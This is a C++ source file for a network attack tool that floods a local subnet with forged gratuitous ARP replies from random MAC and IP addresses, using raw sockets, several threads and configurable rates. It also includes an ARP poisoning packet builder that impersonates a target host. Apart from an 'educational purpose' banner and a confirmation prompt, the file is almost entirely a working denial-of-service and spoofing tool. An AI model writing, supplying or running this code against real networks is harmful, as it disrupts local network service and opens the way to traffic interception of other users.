#include <iostream>
#include <thread>
#include <vector>
#include <random>
#include <chrono>
#include <atomic>
#include <cstring>
#include <iomanip>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <iphlpapi.h>
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "iphlpapi.lib")
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <net/if.h>
    #include <netpacket/packet.h>
    #include <net/ethernet.h>
    #include <unistd.h>
#endif

#pragma pack(push, 1)
struct EthernetHeader {
    uint8_t dst_mac[6];     // Destination MAC address
    uint8_t src_mac[6];     // Source MAC address
    uint16_t ethertype;     // EtherType (0x0806 for ARP)
};

struct ARPHeader {
    uint16_t htype;         // Hardware type (1 for Ethernet)
    uint16_t ptype;         // Protocol type (0x0800 for IPv4)
    uint8_t hlen;           // Hardware length (6 for MAC)
    uint8_t plen;           // Protocol length (4 for IPv4)
    uint16_t operation;     // Operation (1=request, 2=reply)
    uint8_t sha[6];         // Sender hardware address
    uint8_t spa[4];         // Sender protocol address
    uint8_t tha[6];         // Target hardware address
    uint8_t tpa[4];         // Target protocol address
};

struct ARPPacket {
    EthernetHeader eth;
    ARPHeader arp;
};
#pragma pack(pop)

class ARPStormAttacker {
private:
    std::atomic<bool> running{false};
    std::atomic<uint64_t> packet_count{0};
    std::vector<std::thread> threads;
    std::random_device rd;
    
    void generateRandomMAC(uint8_t* mac) {
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        for (int i = 0; i < 6; i++) {
            mac[i] = dis(gen);
        }
    }
    
    void generateRandomIP(uint8_t* ip, const std::string& subnet = "192.168.1") {
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(1, 254);
        
        // Parse subnet (assumes format like "192.168.1")
        sscanf(subnet.c_str(), "%hhu.%hhu.%hhu", &ip[0], &ip[1], &ip[2]);
        ip[3] = dis(gen);
    }
    
    void createGratuitousARP(ARPPacket& packet, const uint8_t* src_mac, const uint8_t* src_ip) {
        // Ethernet header
        memset(packet.eth.dst_mac, 0xFF, 6);  // Broadcast
        memcpy(packet.eth.src_mac, src_mac, 6);
        packet.eth.ethertype = htons(0x0806);  // ARP
        
        // ARP header
        packet.arp.htype = htons(1);           // Ethernet
        packet.arp.ptype = htons(0x0800);      // IPv4
        packet.arp.hlen = 6;                   // MAC length
        packet.arp.plen = 4;                   // IP length
        packet.arp.operation = htons(2);       // ARP Reply
        
        memcpy(packet.arp.sha, src_mac, 6);    // Sender MAC
        memcpy(packet.arp.spa, src_ip, 4);     // Sender IP
        memset(packet.arp.tha, 0x00, 6);      // Target MAC (ignored for gratuitous)
        memcpy(packet.arp.tpa, src_ip, 4);     // Target IP (same as sender)
    }
    
    void createPoisoningARP(ARPPacket& packet, const uint8_t* fake_mac, 
                           const uint8_t* target_ip, const uint8_t* victim_ip) {
        // Ethernet header
        memset(packet.eth.dst_mac, 0xFF, 6);  // Broadcast
        memcpy(packet.eth.src_mac, fake_mac, 6);
        packet.eth.ethertype = htons(0x0806);
        
        // ARP header
        packet.arp.htype = htons(1);
        packet.arp.ptype = htons(0x0800);
        packet.arp.hlen = 6;
        packet.arp.plen = 4;
        packet.arp.operation = htons(2);       // ARP Reply
        
        memcpy(packet.arp.sha, fake_mac, 6);   // Fake MAC
        memcpy(packet.arp.spa, target_ip, 4);  // Target IP we're impersonating
        memset(packet.arp.tha, 0xFF, 6);      // Broadcast
        memcpy(packet.arp.tpa, victim_ip, 4);  // Victim IP
    }

#ifdef _WIN32
    void stormWorker(const std::string& subnet, int duration, int packetsPerSecond) {
        // Windows raw socket implementation is more complex
        // This is a simplified version - in practice, you'd need WinPcap/Npcap
        std::cout << "[!] Raw socket implementation on Windows requires WinPcap/Npcap\n";
        std::cout << "[*] Simulating attack for demonstration...\n";
        
        auto startTime = std::chrono::steady_clock::now();
        auto interval = std::chrono::microseconds(1000000 / packetsPerSecond);
        
        while (running) {
            auto elapsed = std::chrono::steady_clock::now() - startTime;
            if (elapsed >= std::chrono::seconds(duration)) break;
            
            // Simulate packet creation and sending
            ARPPacket packet;
            uint8_t src_mac[6], src_ip[4];
            generateRandomMAC(src_mac);
            generateRandomIP(src_ip, subnet);
            createGratuitousARP(packet, src_mac, src_ip);
            
            packet_count++;
            std::this_thread::sleep_for(interval);
        }
    }
#else
    void stormWorker(const std::string& subnet, int duration, int packetsPerSecond) {
        // Create raw socket
        int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        if (sockfd < 0) {
            std::cerr << "[!] Failed to create raw socket. Run as root.\n";
            return;
        }
        
        auto startTime = std::chrono::steady_clock::now();
        auto interval = std::chrono::microseconds(packetsPerSecond > 0 ? 1000000 / packetsPerSecond : 0);
        
        while (running) {
            auto elapsed = std::chrono::steady_clock::now() - startTime;
            if (elapsed >= std::chrono::seconds(duration)) break;
            
            try {
                ARPPacket packet;
                uint8_t src_mac[6], src_ip[4];
                generateRandomMAC(src_mac);
                generateRandomIP(src_ip, subnet);
                createGratuitousARP(packet, src_mac, src_ip);
                
                ssize_t sent = send(sockfd, &packet, sizeof(packet), 0);
                if (sent > 0) {
                    packet_count++;
                }
                
                if (interval.count() > 0) {
                    std::this_thread::sleep_for(interval);
                }
            } catch (const std::exception& e) {
                std::cerr << "[!] Error in storm worker: " << e.what() << std::endl;
                break;
            }
        }
        
        close(sockfd);
    }
#endif

public:
    ARPStormAttacker() = default;
    
    ~ARPStormAttacker() {
        stopAttack();
    }
    
    void startStormAttack(const std::string& subnet = "192.168.1", 
                         int duration = 60, 
                         int numThreads = 4, 
                         int packetsPerSecond = 100) {
        std::cout << "[*] Starting ARP Storm Attack\n";
        std::cout << "[*] Target Subnet: " << subnet << ".0/24\n";
        std::cout << "[*] Duration: " << duration << " seconds\n";
        std::cout << "[*] Threads: " << numThreads << "\n";
        std::cout << "[*] Rate: " << packetsPerSecond << " packets/second per thread\n";
        std::cout << "[*] Total Rate: " << (packetsPerSecond * numThreads) << " packets/second\n";
        
        running = true;
        packet_count = 0;
        
        // Start worker threads
        for (int i = 0; i < numThreads; i++) {
            threads.emplace_back(&ARPStormAttacker::stormWorker, this, 
                               subnet, duration, packetsPerSecond);
        }
        
        // Monitor progress
        auto startTime = std::chrono::steady_clock::now();
        while (running) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>
                          (std::chrono::steady_clock::now() - startTime).count();
            
            if (elapsed >= duration) {
                break;
            }
            
            double rate = elapsed > 0 ? static_cast<double>(packet_count) / elapsed : 0;
            std::cout << "[*] Packets sent: " << packet_count 
                     << ", Rate: " << std::fixed << std::setprecision(1) << rate << " pps"
                     << ", Elapsed: " << elapsed << "s\n";
        }
        
        stopAttack();
    }
    
    void stopAttack() {
        if (running) {
            std::cout << "[*] Stopping attack...\n";
            running = false;
            
            // Wait for threads to finish
            for (auto& thread : threads) {
                if (thread.joinable()) {
                    thread.join();
                }
            }
            
            threads.clear();
            std::cout << "[*] Attack stopped. Total packets sent: " << packet_count << "\n";
        }
    }
    
    uint64_t getPacketCount() const {
        return packet_count;
    }
};

void printBanner() {
    std::cout << "============================================================\n";
    std::cout << "ARP DoS via Gratuitous ARP Storm Attack Tool (C++)\n";
    std::cout << "Educational/Research Purpose Only\n";
    std::cout << "============================================================\n";
    std::cout << "[!] WARNING: This tool can disrupt network operations!\n";
    std::cout << "[!] Use only on networks you own or have explicit permission to test!\n";
    std::cout << "============================================================\n";
}

void printUsage() {
    std::cout << "Usage: arp_storm [options]\n";
    std::cout << "Options:\n";
    std::cout << "  --subnet <subnet>    Target subnet (default: 192.168.1)\n";
    std::cout << "  --duration <sec>     Attack duration in seconds (default: 60)\n";
    std::cout << "  --threads <num>      Number of threads (default: 4)\n";
    std::cout << "  --rate <pps>         Packets per second per thread (default: 100)\n";
    std::cout << "  --help              Show this help\n";
    std::cout << "\nExample:\n";
    std::cout << "  arp_storm --subnet 192.168.1 --duration 30 --threads 8 --rate 200\n";
}

int main(int argc, char* argv[]) {
#ifdef _WIN32
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "[!] Failed to initialize Winsock\n";
        return 1;
    }
#endif

    // Parse command line arguments
    std::string subnet = "192.168.1";
    int duration = 60;
    int threads = 4;
    int rate = 100;
    
    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];
        
        if (arg == "--help" || arg == "-h") {
            printUsage();
            return 0;
        } else if (arg == "--subnet" && i + 1 < argc) {
            subnet = argv[++i];
        } else if (arg == "--duration" && i + 1 < argc) {
            duration = std::stoi(argv[++i]);
        } else if (arg == "--threads" && i + 1 < argc) {
            threads = std::stoi(argv[++i]);
        } else if (arg == "--rate" && i + 1 < argc) {
            rate = std::stoi(argv[++i]);
        } else {
            std::cerr << "[!] Unknown argument: " << arg << std::endl;
            printUsage();
            return 1;
        }
    }
    
    printBanner();
    
    // Get confirmation
    std::string response;
    std::cout << "Continue? (yes/no): ";
    std::cin >> response;
    
    if (response != "yes" && response != "y") {
        std::cout << "[*] Aborted by user\n";
        return 0;
    }
    
    ARPStormAttacker attacker;
    
    try {
        attacker.startStormAttack(subnet, duration, threads, rate);
    } catch (const std::exception& e) {
        std::cerr << "[!] Attack failed: " << e.what() << std::endl;
        attacker.stopAttack();
    }

#ifdef _WIN32
    WSACleanup();
#endif
    
    return 0;
}
